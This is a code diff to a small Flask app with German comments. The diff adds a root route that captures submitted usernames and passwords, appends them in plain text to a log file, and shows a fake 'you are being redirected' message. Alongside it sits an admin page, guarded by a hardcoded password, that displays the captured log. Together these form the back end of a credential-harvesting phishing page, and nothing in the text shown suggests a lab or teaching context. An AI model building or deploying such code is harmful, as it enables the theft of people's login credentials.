@@ -5,11 +5,24 @@ import os
 app = Flask(__name__)
 
 LOG_FILE = "log.txt"
-ADMIN_PASSWORD = "6067"  # Dein Admin-Passwort
+ADMIN_PASSWORD = "6067"  # Passwort für Admin-Zugang
+
+@app.route("/", methods=["GET", "POST"])
+def home():
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{timestamp}] Username: {username} | Password: {password}\n")
+
+        return "<h2>Danke! Du wirst weitergeleitet...</h2>"
+
+    return render_template("index.html")
 
 @app.route("/admin", methods=["GET", "POST"])
 def admin():
-    # Datei anlegen, falls sie noch nicht existiert
     if not os.path.exists(LOG_FILE):
         with open(LOG_FILE, "w") as f:
             f.write("")
@@ -34,16 +47,6 @@ def admin():
         except Exception as e:
             return f"<h3>Fehler beim Lesen der Datei: {str(e)}</h3>"
 
-    return '''
-        <h2>🔐 Admin-Bereich</h2>
-        <form method="POST">
-            <input type="password" name="password" placeholder="Passwort" required>
-            <button type="submit">Login</button>
-        </form>
-    '''
-
-
-    # Passwortformular anzeigen
     return '''
         <h2>🔐 Admin-Bereich</h2>
         <form method="POST">
